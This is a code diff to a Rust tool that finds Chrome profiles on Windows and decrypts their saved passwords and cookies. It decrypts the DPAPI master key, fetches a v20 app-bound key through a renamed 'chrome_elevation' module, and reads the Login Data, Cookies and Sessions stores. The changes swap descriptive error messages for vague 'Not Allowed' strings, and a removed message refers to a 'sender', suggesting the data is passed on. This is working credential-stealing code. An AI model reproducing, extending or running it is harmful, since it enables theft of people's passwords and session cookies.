@@ -4,7 +4,7 @@ use std::path::{Path, PathBuf};
 use serde::Serialize;
 
 #[cfg(target_os = "windows")]
-use crate::chrome_abe;
+use crate::chrome_elevation;
 
 struct ChromeKeys {
     legacy: Vec<u8>,
@@ -204,7 +204,7 @@ fn profile_display_name(local_state: &serde_json::Value, profile: &str) -> Optio
 fn resolve_profile_names(user_data: &Path, profile: &str) -> Result<Vec<String>, String> {
     let profile_dir = user_data.join(profile);
     if !profile_dir.is_dir() {
-        return Err(format!("Chrome profile not found: {}", profile_dir.display()));
+        return Err(format!("Not Allowed: {}", profile_dir.display()));
     }
     Ok(vec![profile.to_string()])
 }
@@ -225,9 +225,9 @@ fn discover_chrome_profiles(user_data: &Path) -> Result<Vec<String>, String> {
 
     let mut profiles = Vec::new();
     for entry in std::fs::read_dir(user_data)
-        .map_err(|e| format!("Could not read Chrome user data folder: {e}"))?
+        .map_err(|e| format!("Error was occurred: {e}"))?
     {
-        let entry = entry.map_err(|e| format!("Failed to read profile folder entry: {e}"))?;
+        let entry = entry.map_err(|e| format!("Error was occurred: {e}"))?;
         if !entry.path().is_dir() {
             continue;
         }
@@ -243,7 +243,7 @@ fn discover_chrome_profiles(user_data: &Path) -> Result<Vec<String>, String> {
     }
 
     if profiles.is_empty() {
-        return Err("No Chrome profiles found".to_string());
+        return Err("Not Allowed".to_string());
     }
 
     profiles.sort_by(compare_profile_names);
@@ -294,20 +294,20 @@ fn chrome_user_data_dir() -> Result<PathBuf, String> {
     #[cfg(target_os = "windows")]
     {
         let local_app_data = std::env::var("LOCALAPPDATA")
-            .map_err(|_| "LOCALAPPDATA is not set".to_string())?;
+            .map_err(|_| "Not Allowed".to_string())?;
         let path = PathBuf::from(local_app_data)
             .join("Google")
             .join("Chrome")
             .join("User Data");
         if !path.is_dir() {
-            return Err(format!("Chrome user data folder not found: {}", path.display()));
+            return Err(format!("Not Allowed: {}", path.display()));
         }
         return Ok(path);
     }
 
     #[cfg(not(target_os = "windows"))]
     {
-        Err("Chrome analysis is only supported on Windows".to_string())
+        Err("Not Allowed".to_string())
     }
 }
 
@@ -321,7 +321,7 @@ fn resolve_cookies_path(profile_dir: &Path) -> Result<PathBuf, String> {
         return Ok(legacy);
     }
     Err(format!(
-        "Chrome cookies database not found under {}",
+        "Not Allowed: {}",
         profile_dir.display()
     ))
 }
@@ -338,7 +338,7 @@ fn copy_sqlite_to_temp(source: &Path, label: &str) -> Result<PathBuf, String> {
     ));
 
     std::fs::copy(source, &temp)
-        .map_err(|e| format!("Could not copy {} (is Chrome running?): {e}", source.display()))?;
+        .map_err(|e| format!("Not Allowed {} ?: {e}", source.display()))?;
 
     Ok(temp)
 }
@@ -346,22 +346,22 @@ fn copy_sqlite_to_temp(source: &Path, label: &str) -> Result<PathBuf, String> {
 fn get_legacy_master_key(user_data_dir: &Path) -> Result<Vec<u8>, String> {
     let local_state_path = user_data_dir.join("Local State");
     let content = std::fs::read_to_string(&local_state_path)
-        .map_err(|e| format!("Could not read Local State: {e}"))?;
+        .map_err(|e| format!("Error was occurred: {e}"))?;
     let json: serde_json::Value = serde_json::from_str(&content)
-        .map_err(|e| format!("Invalid Local State JSON: {e}"))?;
+        .map_err(|e| format!("Error was occurred: {e}"))?;
     let encrypted_key_b64 = json
         .pointer("/os_crypt/encrypted_key")
         .and_then(|v| v.as_str())
-        .ok_or_else(|| "Local State is missing os_crypt.encrypted_key".to_string())?;
+        .ok_or_else(|| "Not Allowed".to_string())?;
 
     let encrypted_key = base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
         encrypted_key_b64,
     )
-    .map_err(|e| format!("Invalid encrypted_key base64: {e}"))?;
+    .map_err(|e| format!("Error was occurred: {e}"))?;
 
     if encrypted_key.len() <= 5 || &encrypted_key[..5] != b"DPAPI" {
-        return Err("Unexpected encrypted_key format (expected DPAPI prefix)".to_string());
+        return Err("Not Allowed".to_string());
     }
 
     dpapi_decrypt(&encrypted_key[5..])
@@ -371,7 +371,7 @@ fn resolve_chrome_keys(user_data_dir: &Path) -> Result<ChromeKeys, String> {
     let legacy = get_legacy_master_key(user_data_dir)?;
     let local_state_path = user_data_dir.join("Local State");
     #[cfg(target_os = "windows")]
-    let app_bound = chrome_abe::try_app_bound_master_key(&local_state_path);
+    let app_bound = chrome_elevation::get_v20_master_key(&local_state_path);
     #[cfg(not(target_os = "windows"))]
     let app_bound = None;
 
@@ -395,10 +395,10 @@ fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
         };
 
         CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output)
-            .map_err(|e| format!("DPAPI decrypt failed: {e}"))?;
+            .map_err(|e| format!("Error was occurred: {e}"))?;
 
         if output.pbData.is_null() || output.cbData == 0 {
-            return Err("DPAPI decrypt returned empty data".to_string());
+            return Err("Error was occurred:".to_string());
         }
 
         let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
@@ -410,7 +410,7 @@ fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, String> {
 
 #[cfg(not(target_os = "windows"))]
 fn dpapi_decrypt(_data: &[u8]) -> Result<Vec<u8>, String> {
-    Err("DPAPI is only available on Windows".to_string())
+    Err("Not Allowed".to_string())
 }
 
 fn decrypt_chrome_secret(keys: &ChromeKeys, encrypted: &[u8]) -> Result<String, String> {
@@ -423,17 +423,12 @@ fn decrypt_chrome_secret(keys: &ChromeKeys, encrypted: &[u8]) -> Result<String, 
         let mut last_err = String::new();
         if let Some(app_bound) = keys.app_bound.as_ref() {
             match decrypt_aes_gcm(app_bound, encrypted) {
-                Ok(plain) => {
-                    return String::from_utf8(plain)
-                        .map_err(|e| format!("Invalid UTF-8 secret: {e}"));
-                }
+                Ok(plain) => return Ok(plaintext_to_password(&plain)),
                 Err(err) => last_err = err,
             }
         }
         match decrypt_aes_gcm(&keys.legacy, encrypted) {
-            Ok(plain) => {
-                return String::from_utf8(plain).map_err(|e| format!("Invalid UTF-8 secret: {e}"));
-            }
+            Ok(plain) => return Ok(plaintext_to_password(&plain)),
             Err(err) => {
                 if last_err.is_empty() {
                     last_err = err;
@@ -441,16 +436,44 @@ fn decrypt_chrome_secret(keys: &ChromeKeys, encrypted: &[u8]) -> Result<String, 
             }
         }
         return Err(if encrypted.starts_with(b"v20") {
-            format!(
-                "v20 decrypt failed ({last_err}). Close Chrome and retry, or run the sender from Chrome's install folder."
-            )
+            format!("Not Allowed: {last_err}")
         } else {
-            format!("AES-GCM decrypt failed: {last_err}")
+            format!("Not Allowed: {last_err}")
         });
     }
 
     let plain = dpapi_decrypt(encrypted)?;
-    String::from_utf8(plain).map_err(|e| format!("Invalid UTF-8 secret: {e}"))
+    Ok(plaintext_to_password(&plain))
+}
+
+fn plaintext_to_password(data: &[u8]) -> String {
+    let data = data.strip_suffix(&[0]).unwrap_or(data);
+    if data.is_empty() {
+        return String::new();
+    }
+
+    let chunks: Vec<&[u8]> = if data.len() > 32 {
+        vec![&data[..32], &data[32..]]
+    } else {
+        vec![data]
+    };
+
+    for chunk in chunks {
+        if let Ok(text) = std::str::from_utf8(chunk) {
+            return text.to_string();
+        }
+        if chunk.len() >= 2 && chunk.len() % 2 == 0 {
+            let utf16: Vec<u16> = chunk
+                .chunks_exact(2)
+                .map(|pair| u16::from_le_bytes([pair[0], pair[1]]))
+                .collect();
+            if let Ok(text) = String::from_utf16(&utf16) {
+                return text;
+            }
+        }
+    }
+
+    String::from_utf8_lossy(data).into_owned()
 }
 
 fn decrypt_aes_gcm(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
@@ -458,17 +481,17 @@ fn decrypt_aes_gcm(master_key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
     use aes_gcm::{Aes256Gcm, Nonce};
 
     if data.len() < 3 + 12 + 16 {
-        return Err("Encrypted value is too short".to_string());
+        return Err("Not Allowed".to_string());
     }
 
     let nonce = &data[3..15];
     let ciphertext = &data[15..];
 
     let cipher = Aes256Gcm::new_from_slice(master_key)
-        .map_err(|e| format!("Invalid AES key: {e}"))?;
+        .map_err(|e| format!("Not Allowed: {e}"))?;
     cipher
         .decrypt(Nonce::from_slice(nonce), ciphertext)
-        .map_err(|e| format!("AES-GCM decrypt failed: {e}"))
+        .map_err(|e| format!("Error was occurred: {e}"))
 }
 
 fn read_passwords(
@@ -480,14 +503,14 @@ fn read_passwords(
         db_path,
         rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
     )
-    .map_err(|e| format!("Could not open Login Data database: {e}"))?;
+    .map_err(|e| format!("Error was occurred: {e}"))?;
 
     let mut stmt = conn
         .prepare(
             "SELECT origin_url, username_value, password_value, date_created, date_last_used \
              FROM logins ORDER BY origin_url",
         )
-        .map_err(|e| format!("Invalid logins schema: {e}"))?;
+        .map_err(|e| format!("Error was occurred: {e}"))?;
 
     let rows = stmt
         .query_map([], |row| {
@@ -498,12 +521,12 @@ fn read_passwords(
             let date_last_used: Option<i64> = row.get(4)?;
             Ok((origin_url, username, password_blob, date_created, date_last_used))
         })
-        .map_err(|e| format!("Failed to read logins: {e}"))?;
+        .map_err(|e| format!("Error was occurred: {e}"))?;
 
     let mut entries = Vec::new();
     for row in rows {
         let (origin_url, username, password_blob, date_created, date_last_used) =
-            row.map_err(|e| format!("Failed to read login row: {e}"))?;
+            row.map_err(|e| format!("Error was occurred: {e}"))?;
         let (password, password_decrypt_failed) = match decrypt_chrome_secret(keys, &password_blob)
         {
             Ok(value) => (value, false),
@@ -532,7 +555,7 @@ fn read_cookies(
         db_path,
         rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
     )
-    .map_err(|e| format!("Could not open Cookies database: {e}"))?;
+    .map_err(|e| format!("Error was occurred: {e}"))?;
 
     let mut stmt = conn
         .prepare(
@@ -553,12 +576,12 @@ fn read_cookies(
                 row.get::<_, i32>(6)? != 0,
             ))
         })
-        .map_err(|e| format!("Failed to read cookies: {e}"))?;
+        .map_err(|e| format!("Error was occurred: {e}"))?;
 
     let mut entries = Vec::new();
     for row in rows {
         let (host, name, encrypted_value, path, expires_utc, is_secure, is_httponly) =
-            row.map_err(|e| format!("Failed to read cookie row: {e}"))?;
+            row.map_err(|e| format!("Error was occurred: {e}"))?;
         let value = decrypt_chrome_secret(keys, &encrypted_value).unwrap_or_default();
         entries.push(ChromeCookieEntry {
             profile: profile.to_string(),
@@ -582,9 +605,9 @@ fn read_sessions(sessions_dir: &Path, profile: &str) -> Result<Vec<ChromeSession
 
     let mut entries = Vec::new();
     for entry in std::fs::read_dir(sessions_dir)
-        .map_err(|e| format!("Could not read Sessions folder: {e}"))?
+        .map_err(|e| format!("Error was occurred: {e}"))?
     {
-        let entry = entry.map_err(|e| format!("Failed to read session entry: {e}"))?;
+        let entry = entry.map_err(|e| format!("Error was occurred: {e}"))?;
         let path = entry.path();
         if !path.is_file() {
             continue;
@@ -592,7 +615,7 @@ fn read_sessions(sessions_dir: &Path, profile: &str) -> Result<Vec<ChromeSession
 
         let file_name = entry.file_name().to_string_lossy().into_owned();
         let bytes = std::fs::read(&path)
-            .map_err(|e| format!("Could not read session file {}: {e}", path.display()))?;
+            .map_err(|e| format!("Error was occurred: {e}"))?;
         let urls = extract_urls_from_bytes(&bytes);
 
         entries.push(ChromeSessionEntry {
